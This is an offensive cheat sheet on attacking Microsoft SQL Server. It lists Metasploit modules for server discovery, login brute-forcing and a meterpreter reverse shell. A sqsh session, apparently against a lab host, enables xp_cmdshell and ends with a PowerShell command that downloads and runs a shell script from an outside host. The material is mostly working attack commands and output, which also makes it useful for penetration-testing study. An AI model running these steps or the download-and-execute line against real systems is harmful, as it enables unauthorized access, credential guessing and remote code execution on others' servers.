## [+] Attacking MSSQL with Metasploit

[>] Enumerate MSSQL Servers on the network:

msf > use auxiliary/scanner/mssql/mssql_ping\
nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156\
Discover more servers using "Browse for More" via Microsoft SQL Server Management Studio.

[>] Bruteforce MSSQL Database:

msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login

[>] Enumerate MSSQL Database:

msf > use auxiliary/admin/mssql/mssql_enum

[>] Gain shell using gathered credentials

msf > use exploit/windows/mssql/mssql_payload\
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp


Connect to mssql with sqsh

```sh
sqsh -S 10.10.10.59 -U sa -P <password> 
```

Enable xp_cmdshell

```sh
[2] 10.10.10.59.master.2> xp_cmdshell 'whoami'
[2] 10.10.10.59.master.3> go
Msg 15281, Level 16, State 1
Server 'TALLY', Procedure 'xp_cmdshell', Line 1
SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the
security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more
information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

[7] 10.10.10.59.master.2> EXEC SP_CONFIGURE 'show advanced options', 1
[7] 10.10.10.59.master.3> reconfigure
[7] 10.10.10.59.master.4> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
[8] 10.10.10.59.master.1> EXEC SP_CONFIGURE 'xp_cmdshell', 1
[8] 10.10.10.59.master.2> reconfigure
[8] 10.10.10.59.master.3> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
[9] 10.10.10.59.master.1> xp_cmdshell 'whoami'
[9] 10.10.10.59.master.2> go

[7] 10.10.10.59.master.1> xp_cmdshell 'powershell "IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.24:8000/shell.ps1\")"'
[7] 10.10.10.59.master.1> go
```

